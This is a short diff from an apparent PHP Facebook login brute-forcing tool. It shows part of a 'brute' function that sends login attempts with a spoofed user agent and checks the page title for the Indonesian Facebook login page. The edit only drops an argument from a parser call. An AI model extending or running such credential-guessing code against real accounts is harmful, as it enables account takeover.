@@ -89,7 +89,7 @@ function brute($username, $password, $no, $url_brute)
     curl_setopt($ch, CURLOPT_USERAGENT, "Chrome/36.0.1985.125");
     $login = curl_exec($ch);
 
-    $dom->loadStr($login, []);
+    $dom->loadStr($login);
     $contents = $dom->find('title');
 
     if ($contents == "<title>Masuk Facebook | Facebook</title>") {
